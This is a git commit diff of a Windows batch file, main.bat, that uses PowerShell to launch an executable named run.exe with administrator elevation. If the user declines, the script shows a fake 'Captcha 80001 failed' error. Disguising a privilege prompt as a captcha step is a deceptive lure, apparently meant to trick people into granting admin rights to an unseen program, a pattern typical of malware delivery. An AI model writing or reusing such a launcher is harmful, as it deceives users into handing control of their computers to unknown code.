863ee46713f8d1b74dceed58aaaa0dc550d51c17
waveget <nathanppwalker@gmail.com>
2024-10-13 13:52:51 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,13 +1,6 @@
 @echo off
-:: Check for Admin Privileges
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    :: Ask for admin privileges
-    powershell -Command "Start-Process 'run.exe' -Verb RunAs -ErrorAction Stop"
-    if %errorlevel% neq 0 (
-        powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Captcha 80001 failed: User cancelled', 'Error', 'OK', 'Error')"
-    )
-) else (
-    :: If already admin, run the executable directly
-    start "" run.exe
+:: Ask for admin privileges
+powershell -Command "Start-Process 'run.exe' -Verb RunAs"
+if %errorlevel% neq 0 (
+    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Captcha 80001 failed: User cancelled', 'Error', 'OK', 'Error')"
 )
